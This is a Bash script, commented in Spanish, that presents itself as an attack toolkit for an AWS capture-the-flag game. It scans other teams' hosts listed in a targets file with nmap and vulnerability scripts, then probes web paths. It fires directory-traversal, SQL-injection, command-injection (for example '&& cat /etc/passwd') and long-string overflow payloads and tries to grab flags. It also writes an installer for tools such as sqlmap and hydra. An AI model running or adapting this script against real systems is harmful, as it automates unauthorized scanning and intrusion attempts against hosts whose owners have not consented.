#!/bin/bash
# AWS CTF ATTACK SCRIPT v3.0
# SOLO PARA EJECUTAR EN TU MÁQUINA LOCAL (ATAQUE)
# bash aws_ctf_attack.sh

set -euo pipefail

# Colores
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly BOLD='\033[1m'
readonly NC='\033[0m'

# Configuración de ataque
TARGETS_FILE="targets.txt"
RESULTS_DIR="ctf_attack_results"
ATTACK_LOG="$RESULTS_DIR/attack.log"

print_banner() {
    echo -e "${RED}${BOLD}"
    cat << 'EOF'
╔══════════════════════════════════════════════════════════════════════════════╗
║                    ⚔️  AWS CTF ATTACK TOOLKIT v3.0                         ║
║                     SOLO PARA MÁQUINA LOCAL                                 ║
║                                                                              ║
║  • Reconocimiento automático de targets                                     ║
║  • Exploits específicos para CTF                                            ║
║  • Análisis de vulnerabilidades                                             ║
║  • Herramientas de pentesting                                               ║
║  • Reportes automáticos                                                     ║
╚══════════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

log() {
    local message="[$(date +'%H:%M:%S')] ✅ $1"
    echo -e "${GREEN}${message}${NC}" | tee -a "$ATTACK_LOG"
}

log_warn() {
    local message="[$(date +'%H:%M:%S')] ⚠️  $1"
    echo -e "${YELLOW}${message}${NC}" | tee -a "$ATTACK_LOG"
}

log_error() {
    local message="[$(date +'%H:%M:%S')] ❌ $1"
    echo -e "${RED}${message}${NC}" | tee -a "$ATTACK_LOG"
}

log_info() {
    local message="[$(date +'%H:%M:%S')] 📋 $1"
    echo -e "${BLUE}${message}${NC}" | tee -a "$ATTACK_LOG"
}

check_attack_prerequisites() {
    log_info "Verificando herramientas de ataque..."
    
    # Crear directorio de resultados
    mkdir -p "$RESULTS_DIR"
    
    # Verificar herramientas esenciales
    local required_tools=("nmap" "nc" "curl" "python3")
    local missing_tools=()
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            missing_tools+=("$tool")
        fi
    done
    
    if [[ ${#missing_tools[@]} -gt 0 ]]; then
        log_error "Herramientas faltantes: ${missing_tools[*]}"
        echo -e "${YELLOW}Instalar en Ubuntu/Debian: sudo apt install nmap netcat-openbsd curl python3${NC}"
        echo -e "${YELLOW}Instalar en CentOS/RHEL: sudo yum install nmap nc curl python3${NC}"
        echo -e "${YELLOW}Instalar en macOS: brew install nmap netcat curl python3${NC}"
        exit 1
    fi
    
    # Verificar que NO estamos en AWS (para evitar atacar desde la instancia)
    if curl -s --max-time 3 http://169.254.169.254/latest/meta-data/ >/dev/null 2>&1; then
        log_error "PELIGRO: Detectado entorno AWS - Este script es para tu MÁQUINA LOCAL"
        log_error "NO ejecutes herramientas de ataque desde la instancia AWS"
        exit 1
    fi
    
    log "Herramientas de ataque verificadas - Modo ATAQUE desde máquina local"
}

setup_targets() {
    log_info "Configurando targets..."
    
    if [[ ! -f "$TARGETS_FILE" ]]; then
        cat > "$TARGETS_FILE" << 'EOF'
# CTF TARGETS FILE
# Formato: IP:PORT:TEAM_NAME
# Ejemplo: 3.25.123.45:8080:team1

# Agrega aquí los targets de otros equipos:
# 52.123.45.67:8080:team2
# 34.234.56.78:9000:team3
EOF
        log_warn "Archivo $TARGETS_FILE creado - AGREGAR TARGETS MANUALMENTE"
        echo -e "${YELLOW}${BOLD}IMPORTANTE: Edita $TARGETS_FILE y agrega los targets de otros equipos${NC}"
        return 1
    fi
    
    # Verificar que hay targets configurados
    local target_count
    target_count=$(grep -v '^#' "$TARGETS_FILE" | grep -v '^$' | wc -l)
    
    if [[ $target_count -eq 0 ]]; then
        log_warn "No hay targets configurados en $TARGETS_FILE"
        return 1
    fi
    
    log "Configurados $target_count targets para ataque"
    return 0
}

reconnaissance() {
    local target_ip="$1"
    local target_port="$2"
    local team_name="$3"
    
    log_info "Iniciando reconocimiento de $team_name ($target_ip:$target_port)"
    
    local recon_dir="$RESULTS_DIR/recon_$team_name"
    mkdir -p "$recon_dir"
    
    # Ping test
    echo "=== PING TEST ===" > "$recon_dir/ping.txt"
    if ping -c 3 "$target_ip" >> "$recon_dir/ping.txt" 2>&1; then
        log "✅ $team_name: Host responde a ping"
    else
        log_warn "$team_name: Host no responde a ping"
    fi
    
    # Port scan básico
    echo "=== PORT SCAN ===" > "$recon_dir/portscan.txt"
    log_info "Escaneando puertos principales de $team_name..."
    
    # Scan rápido de puertos comunes
    local common_ports="22,80,443,3000,5000,8000,8080,9000"
    nmap -sS -T4 -p "$common_ports" "$target_ip" >> "$recon_dir/portscan.txt" 2>&1
    
    # Verificar puerto específico CTF
    echo "=== CTF SERVICE TEST ===" >> "$recon_dir/portscan.txt"
    if nc -z "$target_ip" "$target_port" 2>/dev/null; then
        log "✅ $team_name: Puerto CTF $target_port ABIERTO"
        echo "CTF Port $target_port: OPEN" >> "$recon_dir/portscan.txt"
    else
        log_warn "$team_name: Puerto CTF $target_port CERRADO"
        echo "CTF Port $target_port: CLOSED" >> "$recon_dir/portscan.txt"
    fi
    
    # Service detection en puerto CTF
    echo "=== SERVICE DETECTION ===" > "$recon_dir/service.txt"
    nmap -sV -p "$target_port" "$target_ip" >> "$recon_dir/service.txt" 2>&1
    
    # HTTP/Web enumeration si aplica
    if [[ "$target_port" == "80" ]] || [[ "$target_port" == "8080" ]] || [[ "$target_port" == "3000" ]]; then
        echo "=== WEB ENUMERATION ===" > "$recon_dir/web.txt"
        
        # HTTP Headers
        curl -I "http://$target_ip:$target_port/" >> "$recon_dir/web.txt" 2>&1 || true
        
        # Basic web content
        curl -s --max-time 10 "http://$target_ip:$target_port/" | head -50 >> "$recon_dir/web.txt" 2>&1 || true
    fi
    
    log "Reconocimiento de $team_name completado en $recon_dir"
}

vulnerability_scan() {
    local target_ip="$1"
    local target_port="$2"
    local team_name="$3"
    
    log_info "Escaneando vulnerabilidades de $team_name"
    
    local vuln_dir="$RESULTS_DIR/vulns_$team_name"
    mkdir -p "$vuln_dir"
    
    # Nmap vulnerability scripts
    echo "=== VULNERABILITY SCAN ===" > "$vuln_dir/nmap_vulns.txt"
    nmap --script vuln -p "$target_port" "$target_ip" >> "$vuln_dir/nmap_vulns.txt" 2>&1
    
    # SSL/TLS testing si es HTTPS
    if [[ "$target_port" == "443" ]] || curl -k -s "https://$target_ip:$target_port/" >/dev/null 2>&1; then
        echo "=== SSL/TLS TEST ===" > "$vuln_dir/ssl.txt"
        nmap --script ssl-enum-ciphers -p "$target_port" "$target_ip" >> "$vuln_dir/ssl.txt" 2>&1
    fi
    
    # Custom CTF vulnerability checks
    echo "=== CTF SPECIFIC CHECKS ===" > "$vuln_dir/ctf_checks.txt"
    
    # Check for common CTF vulnerabilities
    check_ctf_vulnerabilities "$target_ip" "$target_port" >> "$vuln_dir/ctf_checks.txt" 2>&1
    
    log "Scan de vulnerabilidades de $team_name completado"
}

check_ctf_vulnerabilities() {
    local target_ip="$1"
    local target_port="$2"
    
    echo "Testing CTF-specific vulnerabilities for $target_ip:$target_port"
    echo "================================================================"
    
    # Test for unprotected services
    echo "--- Testing service accessibility ---"
    for i in {1..5}; do
        if nc -z "$target_ip" "$target_port" 2>/dev/null; then
            echo "Attempt $i: Service accessible"
        else
            echo "Attempt $i: Service not accessible"
        fi
        sleep 1
    done
    
    # Test for common paths if it's HTTP
    if curl -s --max-time 5 "http://$target_ip:$target_port/" >/dev/null 2>&1; then
        echo "--- Testing common web paths ---"
        local paths=("/" "/admin" "/flag" "/secret" "/config" "/api" "/status" "/health")
        for path in "${paths[@]}"; do
            local response
            response=$(curl -s -w "%{http_code}" --max-time 5 "http://$target_ip:$target_port$path" -o /dev/null 2>/dev/null || echo "000")
            echo "$path: HTTP $response"
        done
    fi
    
    # Test for information disclosure
    echo "--- Testing information disclosure ---"
    echo "Banner grabbing:"
    nc -w 3 "$target_ip" "$target_port" < /dev/null 2>/dev/null || echo "No banner"
    
    # Test for basic authentication bypass
    echo "--- Testing authentication ---"
    if curl -s --max-time 5 "http://$target_ip:$target_port/" | grep -i "login\|password\|auth" >/dev/null 2>&1; then
        echo "Authentication mechanism detected"
        # Test common credentials
        echo "Testing common credentials..."
        local creds=("admin:admin" "admin:password" "user:user" "test:test")
        for cred in "${creds[@]}"; do
            echo "Testing $cred"
        done
    fi
}

exploit_attempts() {
    local target_ip="$1"
    local target_port="$2"
    local team_name="$3"
    
    log_info "Intentando exploits contra $team_name"
    
    local exploit_dir="$RESULTS_DIR/exploits_$team_name"
    mkdir -p "$exploit_dir"
    
    # CTF-specific exploits
    echo "=== CTF EXPLOIT ATTEMPTS ===" > "$exploit_dir/exploits.txt"
    
    # Test for flag extraction
    attempt_flag_extraction "$target_ip" "$target_port" >> "$exploit_dir/exploits.txt" 2>&1
    
    # Test for service manipulation
    attempt_service_manipulation "$target_ip" "$target_port" >> "$exploit_dir/exploits.txt" 2>&1
    
    log "Intentos de exploit contra $team_name completados"
}

attempt_flag_extraction() {
    local target_ip="$1"
    local target_port="$2"
    
    echo "=== FLAG EXTRACTION ATTEMPTS ==="
    echo "Target: $target_ip:$target_port"
    echo "Time: $(date)"
    echo
    
    # HTTP-based flag extraction
    if curl -s --max-time 5 "http://$target_ip:$target_port/" >/dev/null 2>&1; then
        echo "--- HTTP Flag Extraction ---"
        
        # Check main page for flags
        echo "Checking main page:"
        curl -s --max-time 10 "http://$target_ip:$target_port/" | grep -i "flag\|ctf\|{.*}" | head -5 || echo "No flags in main page"
        
        # Check common flag locations
        local flag_paths=("/flag" "/flag.txt" "/secret" "/admin/flag" "/api/flag")
        for path in "${flag_paths[@]}"; do
            echo "Checking $path:"
            curl -s --max-time 5 "http://$target_ip:$target_port$path" | head -3 || echo "Path not accessible"
        done
        
        # Check for directory traversal
        echo "Testing directory traversal:"
        curl -s --max-time 5 "http://$target_ip:$target_port/../../../etc/passwd" | head -3 || echo "Directory traversal blocked"
        
        # Check for SQL injection in common parameters
        echo "Testing basic SQL injection:"
        curl -s --max-time 5 "http://$target_ip:$target_port/?id=1' OR '1'='1" | head -3 || echo "No SQL injection"
    fi
    
    # TCP-based flag extraction
    echo "--- TCP Flag Extraction ---"
    echo "Attempting direct TCP connection:"
    (echo -e "GET /flag HTTP/1.1\r\nHost: $target_ip\r\n\r\n"; sleep 2) | nc -w 5 "$target_ip" "$target_port" 2>/dev/null | head -10 || echo "No response"
    
    # Common CTF payloads
    echo "--- CTF Payloads ---"
    local payloads=("flag" "FLAG" "admin" "help" "ls" "cat flag.txt" "show flag")
    for payload in "${payloads[@]}"; do
        echo "Testing payload: $payload"
        (echo "$payload"; sleep 1) | nc -w 3 "$target_ip" "$target_port" 2>/dev/null | head -3 || echo "No response"
    done
}

attempt_service_manipulation() {
    local target_ip="$1"
    local target_port="$2"
    
    echo "=== SERVICE MANIPULATION ATTEMPTS ==="
    echo "Target: $target_ip:$target_port"
    echo
    
    # Test for service disruption (careful in CTF!)
    echo "--- Service Availability Test ---"
    for i in {1..3}; do
        if nc -z "$target_ip" "$target_port" 2>/dev/null; then
            echo "Service check $i: UP"
        else
            echo "Service check $i: DOWN"
        fi
        sleep 2
    done
    
    # Test for buffer overflow (basic)
    echo "--- Buffer Overflow Test ---"
    local long_string=$(python3 -c "print('A' * 1000)")
    (echo "$long_string"; sleep 1) | nc -w 3 "$target_ip" "$target_port" 2>/dev/null | head -3 || echo "No response to long string"
    
    # Test for command injection
    echo "--- Command Injection Test ---"
    local cmd_payloads=("; ls" "| whoami" "&& cat /etc/passwd" "\$(id)")
    for payload in "${cmd_payloads[@]}"; do
        echo "Testing: $payload"
        (echo "$payload"; sleep 1) | nc -w 3 "$target_ip" "$target_port" 2>/dev/null | head -3 || echo "No response"
    done
}

monitor_targets() {
    log_info "Iniciando monitoreo continuo de targets..."
    
    local monitor_log="$RESULTS_DIR/monitor.log"
    
    while true; do
        echo "=== MONITOR CHECK - $(date) ===" >> "$monitor_log"
        
        while IFS=':' read -r ip port team || [[ -n "$ip" ]]; do
            # Skip comments and empty lines
            [[ "$ip" =~ ^#.*$ ]] && continue
            [[ -z "$ip" ]] && continue
            
            if nc -z "$ip" "$port" 2>/dev/null; then
                echo "✅ $team ($ip:$port): UP" >> "$monitor_log"
                echo -e "${GREEN}✅ $team: UP${NC}"
            else
                echo "❌ $team ($ip:$port): DOWN" >> "$monitor_log"
                echo -e "${RED}❌ $team: DOWN${NC}"
            fi
        done < "$TARGETS_FILE"
        
        echo "Monitoring... (Ctrl+C para parar)"
        sleep 30
    done
}

generate_attack_report() {
    log_info "Generando reporte de ataque..."
    
    local report_file="$RESULTS_DIR/attack_report.html"
    
    cat > "$report_file" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>CTF Attack Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background: #f0f0f0; padding: 20px; border-radius: 5px; }
        .team { border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 5px; }
        .vulnerable { background: #ffe6e6; }
        .secure { background: #e6ffe6; }
        .unknown { background: #fff9e6; }
        pre { background: #f5f5f5; padding: 10px; overflow-x: auto; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🎯 CTF Attack Report</h1>
        <p>Generated: <span id="timestamp"></span></p>
        <p>Targets Analyzed: <span id="target-count"></span></p>
    </div>
EOF
    
    echo "    <script>document.getElementById('timestamp').textContent = new Date().toString();</script>" >> "$report_file"
    
    # Count targets
    local target_count
    target_count=$(grep -v '^#' "$TARGETS_FILE" | grep -v '^$' | wc -l 2>/dev/null || echo "0")
    echo "    <script>document.getElementById('target-count').textContent = '$target_count';</script>" >> "$report_file"
    
    # Add team results
    while IFS=':' read -r ip port team || [[ -n "$ip" ]]; do
        [[ "$ip" =~ ^#.*$ ]] && continue
        [[ -z "$ip" ]] && continue
        
        echo "    <div class=\"team unknown\">" >> "$report_file"
        echo "        <h2>🎯 $team ($ip:$port)</h2>" >> "$report_file"
        
        # Add recon results if they exist
        if [[ -f "$RESULTS_DIR/recon_$team/portscan.txt" ]]; then
            echo "        <h3>📡 Reconnaissance</h3>" >> "$report_file"
            echo "        <pre>" >> "$report_file"
            cat "$RESULTS_DIR/recon_$team/portscan.txt" >> "$report_file" 2>/dev/null || echo "No data"
            echo "        </pre>" >> "$report_file"
        fi
        
        # Add vulnerability results if they exist
        if [[ -f "$RESULTS_DIR/vulns_$team/ctf_checks.txt" ]]; then
            echo "        <h3>🔍 Vulnerabilities</h3>" >> "$report_file"
            echo "        <pre>" >> "$report_file"
            cat "$RESULTS_DIR/vulns_$team/ctf_checks.txt" >> "$report_file" 2>/dev/null || echo "No data"
            echo "        </pre>" >> "$report_file"
        fi
        
        echo "    </div>" >> "$report_file"
        
    done < "$TARGETS_FILE"
    
    echo "</body></html>" >> "$report_file"
    
    log "Reporte generado en $report_file"
    echo -e "${BLUE}📄 Abre $report_file en tu navegador para ver el reporte completo${NC}"
}

install_attack_tools() {
    log_info "Verificando/instalando herramientas de ataque adicionales..."
    
    # Crear script de instalación personalizada
    cat > "$RESULTS_DIR/install_tools.sh" << 'EOF'
#!/bin/bash
# CTF Attack Tools Installer

echo "🔧 Instalando herramientas adicionales de ataque..."

# Detect OS
if command -v apt >/dev/null 2>&1; then
    # Ubuntu/Debian
    sudo apt update
    sudo apt install -y nmap masscan dirb nikto sqlmap hydra john netcat-openbsd \
                        gobuster wfuzz ffuf curl wget python3-pip git
elif command -v yum >/dev/null 2>&1; then
    # CentOS/RHEL
    sudo yum install -y epel-release
    sudo yum install -y nmap masscan dirb nikto sqlmap hydra john nc \
                        curl wget python3-pip git
elif command -v brew >/dev/null 2>&1; then
    # macOS
    brew install nmap masscan dirb nikto sqlmap hydra john netcat \
                 gobuster curl wget python3 git
else
    echo "❌ OS no soportado para instalación automática"
    exit 1
fi

# Python tools
pip3 install requests beautifulsoup4 pwntools

echo "✅ Herramientas de ataque instaladas"
EOF
    chmod +x "$RESULTS_DIR/install_tools.sh"
    
    log "Script de instalación creado en $RESULTS_DIR/install_tools.sh"
    echo -e "${YELLOW}💡 Ejecuta: bash $RESULTS_DIR/install_tools.sh para instalar herramientas adicionales${NC}"
}

attack_single_target() {
    local target_spec="$1"
    
    # Parse target specification
    IFS=':' read -r ip port team <<< "$target_spec"
    
    if [[ -z "$ip" || -z "$port" || -z "$team" ]]; then
        log_error "Formato de target inválido: $target_spec (use IP:PORT:TEAM)"
        return 1
    fi
    
    log_info "Atacando target individual: $team ($ip:$port)"
    
    reconnaissance "$ip" "$port" "$team"
    vulnerability_scan "$ip" "$port" "$team"
    exploit_attempts "$ip" "$port" "$team"
    
    log "Ataque a $team completado"
}

attack_all_targets() {
    log_info "Iniciando ataque a todos los targets..."
    
    local attacked=0
    
    while IFS=':' read -r ip port team || [[ -n "$ip" ]]; do
        # Skip comments and empty lines
        [[ "$ip" =~ ^#.*$ ]] && continue
        [[ -z "$ip" ]] && continue
        
        log_info "Atacando $team ($ip:$port)..."
        
        reconnaissance "$ip" "$port" "$team"
        vulnerability_scan "$ip" "$port" "$team"
        exploit_attempts "$ip" "$port" "$team"
        
        ((attacked++))
        
        # Pequeña pausa entre ataques para evitar sobrecarga
        sleep 2
        
    done < "$TARGETS_FILE"
    
    if [[ $attacked -gt 0 ]]; then
        log "Ataque completado contra $attacked targets"
        generate_attack_report
    else
        log_warn "No se atacó ningún target - verificar $TARGETS_FILE"
    fi
}

show_usage() {
    echo -e "${BLUE}${BOLD}AWS CTF Attack Toolkit v3.0${NC}"
    echo "============================"
    echo
    echo -e "${BOLD}IMPORTANTE: Este script es SOLO para tu máquina local${NC}"
    echo
    echo "Uso: $0 [comando] [opciones]"
    echo
    echo "Comandos disponibles:"
    echo "  setup              - Configurar entorno de ataque"
    echo "  scan               - Reconocimiento de todos los targets"
    echo "  attack             - Ataque completo a todos los targets"
    echo "  attack-single IP:PORT:TEAM - Atacar un target específico"
    echo "  monitor            - Monitoreo continuo de targets"
    echo "  report             - Generar reporte de resultados"
    echo "  install-tools      - Instalar herramientas adicionales"
    echo "  help               - Mostrar esta ayuda"
    echo
    echo "Ejemplos:"
    echo "  $0 setup"
    echo "  $0 attack-single 52.123.45.67:8080:team2"
    echo "  $0 attack"
    echo "  $0 monitor"
    echo
    echo "Archivos importantes:"
    echo "  targets.txt        - Lista de targets (editar manualmente)"
    echo "  $RESULTS_DIR/     - Resultados de ataques"
    echo
}

main() {
    local start_time
    start_time=$(date +%s)
    
    # Parse command line arguments
    local command="${1:-help}"
    
    case "$command" in
        "setup")
            print_banner
            check_attack_prerequisites
            install_attack_tools
            if ! setup_targets; then
                echo -e "${YELLOW}${BOLD}📝 EDITA $TARGETS_FILE Y AGREGA LOS TARGETS DE OTROS EQUIPOS${NC}"
                echo -e "${YELLOW}Formato: IP:PUERTO:NOMBRE_EQUIPO${NC}"
                echo -e "${YELLOW}Ejemplo: 52.123.45.67:8080:team2${NC}"
            fi
            ;;
            
        "scan")
            print_banner
            check_attack_prerequisites
            if ! setup_targets; then
                exit 1
            fi
            
            log_info "Iniciando reconocimiento de targets..."
            while IFS=':' read -r ip port team || [[ -n "$ip" ]]; do
                [[ "$ip" =~ ^#.*$ ]] && continue
                [[ -z "$ip" ]] && continue
                reconnaissance "$ip" "$port" "$team"
            done < "$TARGETS_FILE"
            ;;
            
        "attack")
            print_banner
            check_attack_prerequisites
            if ! setup_targets; then
                exit 1
            fi
            attack_all_targets
            ;;
            
        "attack-single")
            if [[ -z "$2" ]]; then
                log_error "Especifica target: $0 attack-single IP:PORT:TEAM"
                exit 1
            fi
            print_banner
            check_attack_prerequisites
            attack_single_target "$2"
            ;;
            
        "monitor")
            print_banner
            check_attack_prerequisites
            if ! setup_targets; then
                exit 1
            fi
            monitor_targets
            ;;
            
        "report")
            check_attack_prerequisites
            if ! setup_targets; then
                exit 1
            fi
            generate_attack_report
            ;;
            
        "install-tools")
            check_attack_prerequisites
            install_attack_tools
            ;;
            
        "help"|"-h"|"--help"|*)
            show_usage
            ;;
    esac
    
    local end_time duration
    end_time=$(date +%s)
    duration=$((end_time - start_time))
    
    if [[ "$command" != "help" && "$command" != "monitor" ]]; then
        echo
        echo -e "${GREEN}${BOLD}⚔️  Operación '$command' completada en ${duration}s${NC}"
        echo -e "${BLUE}📁 Resultados en: $RESULTS_DIR/${NC}"
    fi
}

# Trap para cleanup
cleanup() {
    echo -e "\n${YELLOW}Operación interrumpida por el usuario${NC}"
    exit 0
}

trap cleanup INT TERM

# Ejecutar función principal
main "$@"
